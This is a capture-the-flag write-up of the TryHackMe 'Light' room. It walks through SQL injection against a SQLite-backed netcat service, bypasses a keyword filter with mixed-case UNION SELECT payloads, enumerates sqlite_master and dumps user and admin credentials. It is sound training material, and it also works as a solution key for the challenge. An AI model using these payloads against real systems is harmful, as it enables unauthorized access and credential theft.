# [Light](https://tryhackme.com/room/lightroom)

<a href="https://tryhackme.com/room/lightroom"><figure><img src="./assets/logo.png" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> Welcome to the Light database application!

Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/lightroom), made by [tryhackme](https://tryhackme.com/p/tryhackme) and [hadrian3689](https://tryhackme.com/p/hadrian3689).

Dificulty: `Easy`

Solved in: `2026/07/03`

# Table of Contents

- [Light](#light)
- [Table of Contents](#table-of-contents)
- [Writeup](#writeup)

# Writeup

The machine is pretty simple, its access instructions are even available in its description:

```
I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using nc 10.66.142.90 1337
You can use the username smokey in order to get started.
```

The process is, then, answering the three main questions:

- Q: What is the admin username?
- Q: What is the password to the username mentioned in question 1?
- Q: What is the flag?

After testing the connection...

```bash
$ ping -c 3 10.66.142.90
PING 10.66.142.90 (10.66.142.90) 56(84) bytes of data.
64 bytes from 10.66.142.90: icmp_seq=1 ttl=62 time=197 ms
64 bytes from 10.66.142.90: icmp_seq=2 ttl=62 time=220 ms
64 bytes from 10.66.142.90: icmp_seq=3 ttl=62 time=244 ms

--- 10.66.142.90 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 196.913/220.374/244.211/19.311 ms
```

Just connect with `netcat`[^nc] as indicated by the machine's description.

```bash
$ nc 10.66.142.90 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: admin
Username not found.
```

Seems the system is a basic query, where we pass in the user and the system answers its password. A simple test reveals the system is vulnerable:

```
Please enter your username: '
Error: unrecognized token: "' LIMIT 30"
```

Immediately, however, some of the most basic `SQLi` are blocked:

```
Please enter your username: ' OR '1'='1' ---
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: ' OR SUBSTRING('', 1, 30) OR 'a
Error: no such function: SUBSTRING
Please enter your username: union
Ahh there is a word in there I don't like :(
Please enter your username: select
Ahh there is a word in there I don't like :(
```

No comments (believe me when I say, I tried even URL bypass), there's no system functions (such as `substring()` or `database()`) and certain keywords are restricted (`union` and `select`).

The keyword restriction is easily bypassed:

```
Please enter your username: sElect
Username not found.
Please enter your username: uNion
Username not found.
```

Which means we can still use them. Before that, it's worth trying to figure out the query. Considering only the password is returned, and that the test is with `'` earlier showed part of the query, we can assume with great certainty that it has the following format:

```sql
SELECT password FROM users WHERE username='input' LIMIT 30;
```

With `username` and `password` being columns from `users` and `input` the text we input. Because of the trailing `LIMIT 30;`, it's unviable to use `ORDER BY`, but it isn't much worrying.

I then follow to try and make this system reply with my own query...

```
Please enter your username: ' uniOn sElect 1 where '1'='1
Password: 1
Please enter your username: ' uniOn sElect 2 where '1'='1
Password: 2
```

And, as so, one can then discover the system's version.

```
Please enter your username: ' uniOn sElect banner FROM v$version where '1'='1
Error: no such table: v$version
Please enter your username: ' uniOn sElect version FROM v$instance where '1'='1
Error: no such table: v$instance
Please enter your username: ' uniOn sElect version() where '1'='1
Error: no such function: version
Please enter your username: ' uniOn sElect @@version where '1'='1
Error: unrecognized token: "@"
Please enter your username: ' uniOn sElect %40%40version where '1'='1
Error: near "%": syntax error
Please enter your username: ' uniOn sElect SERVERPROPERTY('productversion') where '1'='1
Error: no such function: SERVERPROPERTY

Please enter your username: ' uniOn sElect sqlite_version() where '1'='1
Password: 3.31.1
```

Wohoo! We've got a `SQLite 3.31.1` in hands. With this I can attack the metadata values from `SQLite`, specifically `sqlite_master`, with enumeration:

```
Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='1
Password: usertable
Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='2
Password: admintable
Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='3
Username not found.
```

> Em `SQLite`, `rowid` is an `unsigned int` intrinsically associated with each column, unique per table. Starts at `1`.

We've got two tables: `usertable` and `admintable`. The attack follows, then, using these new values as the tables:

```
' uniOn sElect username FROM usertable WHERE rowid='0
```

Assuming, here, that the column names really are `username` and `password`. Otherwise, we'd have to find those.

For the `usertable` an enumeration lends us:

```
Please enter your username: alice
Password: tF8tj2o94WE4LKC
Please enter your username: rob
Password: yAn4fPaF2qpCKpR
Please enter your username: john
Password: e74tqwRh2oApPo6
Please enter your username: michael
Password: 7DV4dwA0g5FacRe
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: hazel
Password: EcSuU35WlVipjXG
Please enter your username: ralph
Password: YO1U9O1m52aJImA
Please enter your username: steve
Password: WObjufHX1foR8d7
```

And, for `admintable`:

```
Please enter your username: ' uniOn sElect username FROM admintable where rowid='1
Password: <ADMIN_U>
Please enter your username: ' uniOn sElect password FROM admintable where rowid='1
Password: <ADMIN_P>

Please enter your username: ' uniOn sElect username FROM admintable where rowid='2
Password: flag
Please enter your username: ' uniOn sElect password FROM admintable where rowid='2
Password: <FLAG_SQL>
```

Simple and effective.

- Q: What is the admin username? A: <ADMIN_U>
- Q: What is the password to the username mentioned in question 1? A: <ADMIN_P>
- Q: What is the flag? A: <FLAG_SQL>

[^nc]: https://nc110.sourceforge.io/